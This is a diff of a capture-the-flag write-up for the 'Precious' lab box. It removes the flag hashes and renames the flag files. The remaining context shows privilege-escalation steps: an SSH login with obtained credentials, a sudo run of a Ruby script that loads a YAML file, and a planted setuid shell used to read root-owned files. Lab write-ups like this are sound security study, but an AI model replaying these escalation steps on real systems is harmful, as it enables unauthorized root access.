@@ -1,7 +1,7 @@
 ---
 title: Precious
 slug: Precious
-tags: [Linux, PDFkit, YAML-Deserialization, Vulnerability Research]
+tags: [YAML-Deserialization, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -122,10 +122,10 @@ ruby@precious:/home$ cd henry
 cd henry
 ruby@precious:/home/henry$ ls
 ls
-user.txt
-ruby@precious:/home/henry$ cat user.txt
-cat user.txt
-cat: user.txt: Permission denied
+local-proof.txt
+ruby@precious:/home/henry$ cat local-proof.txt
+cat local-proof.txt
+cat: local-proof.txt: Permission denied
 ```
 
 ```bash
@@ -157,8 +157,7 @@ We got henry creds.
 
 ```bash
 $ ssh henry@precious.htb
-henry@precious:~$ cat user.txt
-66badd604ee8da60a6d7e6f11e8e6582
+henry@precious:~$ cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -237,15 +236,14 @@ The `.rb` file loaded the `dependencies.yml` file when executed. Change conten
 
 ```bash
 henry@precious:~$ ls
-dependencies.yml  user.txt
+dependencies.yml  local-proof.txt
 henry@precious:~$ sudo ruby /opt/update_dependencies.rb 
 sh: 1: reading: not found
 Traceback (most recent call last):
 <SNIP>
 /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system`: no implicit conversion of nil into String (TypeError)
 henry@precious:~$ /tmp/at0m -p
-at0m-5.1# cat /root/root.txt
-50eff643541e905a8b9c0479f38b8268
+at0m-5.1# cat /root/privileged-proof.txt
 ```
 
 ---
